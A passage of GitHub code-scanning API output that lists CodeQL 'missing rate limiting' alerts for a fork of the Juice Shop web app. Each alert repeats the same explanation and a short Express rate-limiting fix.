windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a database access, but is not rate-limited."},"location":{"path":"server.ts","start_line":586,"end_line":586,"start_column":36,"end_column":48},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/29/instances","dismissal_approved_by":null},{"number":28,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/28","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/28","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs authorization, but is not rate-limited."},"location":{"path":"server.ts","start_line":568,"end_line":568,"start_column":69,"end_column":82},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/28/instances","dismissal_approved_by":null},{"number":27,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/27","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/27","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs authorization, but is not rate-limited."},"location":{"path":"server.ts","start_line":568,"end_line":568,"start_column":32,"end_column":67},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/27/instances","dismissal_approved_by":null},{"number":26,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/26","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/26","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs authorization, but is not rate-limited."},"location":{"path":"server.ts","start_line":564,"end_line":564,"start_column":32,"end_column":39},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/26/instances","dismissal_approved_by":null},{"number":25,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/25","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/25","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs authorization, but is not rate-limited."},"location":{"path":"server.ts","start_line":441,"end_line":441,"start_column":56,"end_column":78},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/25/instances","dismissal_approved_by":null},{"number":24,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/24","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/24","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs authorization, but is not rate-limited."},"location":{"path":"server.ts","start_line":409,"end_line":409,"start_column":33,"end_column":56},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/24/instances","dismissal_approved_by":null},{"number":23,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/23","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/23","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":296,"end_line":296,"start_column":132,"end_column":156},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/23/instances","dismissal_approved_by":null},{"number":22,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/22","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/22","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":295,"end_line":295,"start_column":125,"end_column":144},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/22/instances","dismissal_approved_by":null},{"number":21,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/21","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/21","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":274,"end_line":274,"start_column":34,"end_column":49},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/21/instances","dismissal_approved_by":null},{"number":20,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/20","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/20","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":269,"end_line":269,"start_column":36,"end_column":47},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/20/instances","dismissal_approved_by":null},{"number":19,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/19","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/19","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: 